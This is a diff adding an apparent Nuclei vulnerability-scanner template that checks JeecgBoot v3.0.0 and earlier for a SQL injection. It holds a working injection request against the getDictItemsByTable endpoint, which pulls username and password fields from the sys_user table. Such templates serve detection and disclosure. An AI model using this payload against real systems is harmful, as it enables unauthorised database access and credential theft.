@@ -1,0 +1,32 @@
+id: jeecgboot-sql-injection
+info:
+  name: JeecgBoot SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    JeecgBoot v3.0.0 and earlier versions are vulnerable to SQL injection. This vulnerability allows attackers to execute arbitrary SQL commands and retrieve sensitive database information.
+  reference:
+    - https://github.com/jeecgboot/jeecg-boot
+  classification:
+    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 9.8
+  tags: sql-injection
+
+variables:
+  table: "sys_user"
+
+http:
+  - raw:
+      - |
+        GET /jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20{{table}}/*,%20'/x.js HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "username"
+          - "password"
+          - "as \"label\",x.js as \"value\" from"
+      - type: status
+        status:
+          - 200
